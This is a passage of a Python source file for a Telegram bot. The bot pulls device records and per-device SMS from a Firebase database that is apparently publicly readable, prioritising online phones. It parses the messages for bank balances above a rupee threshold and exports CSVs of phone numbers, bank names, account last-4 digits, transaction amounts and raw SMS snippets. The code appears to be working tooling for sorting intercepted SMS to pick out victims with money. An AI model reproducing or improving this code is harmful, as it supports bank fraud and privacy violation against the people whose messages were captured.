async def scan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if scan_lock.locked():
        await update.effective_message.reply_text("A scan is already running.")
        return
    path = context.args[0] if context.args else ROOT_PATH
    path = path if path.startswith("/") else "/" + path
    await update.effective_message.reply_text(f"Starting fresh scan at {path} …")
    await run_scan(update.effective_message, path, "all", True)


# Cap how many message trees we pull per scan (prevents hang on huge DBs like 300+ devices)
MAX_MESSAGE_FETCH = env_int("MAX_MESSAGE_FETCH", 120, minimum=10)


async def _fetch_messages_for_ids(
    client_ids: list[str],
    concurrency: int = 6,
    progress_cb=None,
) -> dict[str, Any]:
    """Fetch messages/{id} in small parallel batches. Never hangs forever."""
    out: dict[str, Any] = {}
    sem = asyncio.Semaphore(concurrency)
    done = 0
    total = len(client_ids)

    async def one(cid: str) -> None:
        nonlocal done
        async with sem:
            try:
                # short timeout so one slow device cannot block the whole scan
                node = await asyncio.wait_for(firebase_read(f"messages/{cid}"), timeout=12)
                if node is not None:
                    out[cid] = node
            except Exception as exc:
                log.debug("messages/%s failed: %s", cid, exc)
            finally:
                done += 1
                if progress_cb and done % 20 == 0:
                    try:
                        await progress_cb(done, total)
                    except Exception:
                        pass

    for i in range(0, len(client_ids), concurrency * 3):
        batch = client_ids[i : i + concurrency * 3]
        await asyncio.gather(*(one(cid) for cid in batch))
    return out


async def run_scan(message: Any, path: str, mode: str = "all", with_buttons: bool = True) -> None:
    async with scan_lock:
        sid = store.start(path)
        try:
            # IMPORTANT: do NOT download full root (messages blob is huge and hangs).
            # Load clients + devices only, then pull messages per-device like the panel.
            clients: dict[str, Any] = {}
            devices: dict[str, Any] = {}

            await message.reply_text("Loading clients …")
            try:
                c = await asyncio.wait_for(firebase_read("clients"), timeout=30)
                if isinstance(c, dict):
                    clients = c
            except Exception as exc:
                log.warning("clients read failed: %s", exc)

            try:
                d = await asyncio.wait_for(firebase_read("devices"), timeout=20)
                if isinstance(d, dict):
                    devices = d
            except Exception as exc:
                log.debug("devices read failed/absent: %s", exc)

            # If custom path was given and clients empty, try that path once (non-root preferred)
            if not clients and not devices and path not in ("", "/"):
                try:
                    snap = await asyncio.wait_for(firebase_read(path), timeout=40)
                    if isinstance(snap, dict):
                        if isinstance(snap.get("clients"), dict):
                            clients = snap["clients"]
                        if isinstance(snap.get("devices"), dict):
                            devices = snap["devices"]
                        # only use inline messages if already small
                        if isinstance(snap.get("messages"), dict) and len(snap["messages"]) <= 30:
                            # rare small DB case
                            pass
                except Exception as exc:
                    log.warning("path read failed: %s", exc)

            snapshot: dict[str, Any] = {"clients": clients, "devices": devices}
            client_ids = sorted(set(clients) | set(devices))

            if not client_ids:
                raise RuntimeError(
                    "No clients/devices found. Check Firebase URL and that rules allow public read on /clients."
                )

            # Prefer online devices first for message fetch, then the rest (capped)
            def _is_online_id(cid: str) -> bool:
                node = devices.get(cid) if isinstance(devices.get(cid), dict) else clients.get(cid)
                if not isinstance(node, dict):
                    return False
                return online_value_from_dict(node) == "online"

            online_ids = [cid for cid in client_ids if _is_online_id(cid)]
            offline_ids = [cid for cid in client_ids if cid not in set(online_ids)]
            prioritized = online_ids + offline_ids
            to_fetch = prioritized[:MAX_MESSAGE_FETCH]

            await message.reply_text(
                f"Devices: {len(client_ids)} (online≈{len(online_ids)}). "
                f"Fetching SMS for {len(to_fetch)} devices (cap {MAX_MESSAGE_FETCH}) …"
            )

            async def progress(done: int, total: int) -> None:
                if done in {20, 40, 60, 80, 100} or done == total:
                    await message.reply_text(f"SMS progress: {done}/{total} …")

            messages_map = await _fetch_messages_for_ids(to_fetch, concurrency=6, progress_cb=progress)

            records = scan_device_snapshot(snapshot, path or "/", messages_override=messages_map)
            store.finish(sid, records, "completed")

            with_bal = sum(1 for r in records if r.available_balance >= BALANCE_THRESHOLD)
            await message.reply_text(
                f"Scan done. Parsed balances ≥ ₹{int(BALANCE_THRESHOLD)}: {with_bal} / {len(records)} devices."
            )
            await reply_report(message, format_report(records, mode), with_buttons)
        except Exception as e:
            log.exception("scan failed")
            store.finish(sid, [], "failed", str(e))
            await message.reply_text(f"Scan failed: {esc(e)}")


@admin_only
async def report_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    mode = (query.data or "report:all").split(":", 1)[-1]
    if mode == "refresh":
        await query.message.reply_text("Refreshing Firebase data …")
        await run_scan(query.message, ROOT_PATH, "all", True)
        return
    row = store.latest()
    if not row or row["status"] != "completed":
        await query.message.reply_text("No completed scan yet. Send a Firebase URL first.")
        return
    records = [Record(**item) for item in json.loads(row["records"] or "[]")]
    await reply_report(query.message, format_report(records, mode), True)


@admin_only
async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    r = store.latest()
    await update.effective_message.reply_text(
        "No scans yet."
        if not r
        else f"Scan #{r['id']} — {r['status']}\nStarted: {r['started']}\nFinished: {r['finished'] or 'running'}\nError: {r['error'] or '-'}"
    )


@admin_only
async def report(update: Update, context: ContextTypes.DEFAULT_TYPE):
    r = store.latest()
    if not r or r["status"] != "completed":
        await update.effective_message.reply_text("Run /scan first.")
        return
    rs = [Record(**x) for x in json.loads(r["records"] or "[]")]
    mode = context.args[0].lower() if context.args and context.args[0].lower() in {"all", "missing"} else "all"
    await reply_report(update.effective_message, format_report(rs, mode))


@admin_only
async def export(update: Update, context: ContextTypes.DEFAULT_TYPE):
    r = store.latest()
    if not r or r["status"] != "completed":
        await update.effective_message.reply_text("Run /scan first.")
        return
    rs = [Record(**x) for x in json.loads(r["records"] or "[]")]
    mode = context.args[0].lower() if context.args and context.args[0].lower() in {"all", "missing"} else "all"
    rs = selected(rs)
    # Apply balance filter
    rs = [x for x in rs if x.available_balance >= BALANCE_THRESHOLD]
    if mode == "missing":
        rs = [x for x in rs if not x.sms_present]

    buf = io.StringIO()
    fields = [
        "identity", "source_path", "device_id", "client_id", "phone", "network",
        "online", "battery", "sender_ids", "last_seen", "sms_present",
        "duplicate_count", "raw_hash",
        "available_balance", "bank_name", "account_last4",
        "transaction_amount", "transaction_type", "raw_sms_snippet", "balance_detected_at",
    ]
    w = csv.DictWriter(buf, fieldnames=fields)
    w.writeheader()
    for x in rs:
        d = asdict(x)
        d["sender_ids"] = ",".join(x.sender_ids)
        w.writerow(d)
    await update.effective_message.reply_document(
        io.BytesIO(buf.getvalue().encode()),
        filename=f"era-x-balance-{mode}.csv",
    )


def build_application() -> Application:
    app = Application.builder().token(TOKEN).build()
    for name, fn in {
        "start": start,
        "help": help_cmd,
        "firebase": firebase_cmd,
        "allowclient": allowclient,
        "removeclient": removeclient,
        "listclients": listclients,
        "addsender": addsender,
        "removesender": removesender,
        "listsenders": listsenders,
        "scan": scan,
        "status": status,
        "report": report,
        "export": export,
    }.items():
        app.add_handler(CommandHandler(name, fn))
    app.add_handler(CallbackQueryHandler(report_callback, pattern=r"^report:"))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, firebase_url_message))
    return app


def main() -> None:
    if not TOKEN:
        raise SystemExit(
            "TELEGRAM_BOT_TOKEN is required. Put a new token in .env beside main.py or export TELEGRAM_BOT_TOKEN before starting."
        )
    if not ADMIN_IDS:
        raise SystemExit("TELEGRAM_ADMIN_IDS must contain numeric Telegram user IDs")
    try:
        build_application().run_polling(allowed_updates=Update.ALL_TYPES)
    except (TimedOut, NetworkError) as exc:
        log.warning("Telegram connection failed (%s); restarting in 10 seconds", exc)
        time.sleep(10)
        os.execv(sys.executable, [sys.executable, *sys.argv])


if __name__ == "__main__":
    main()
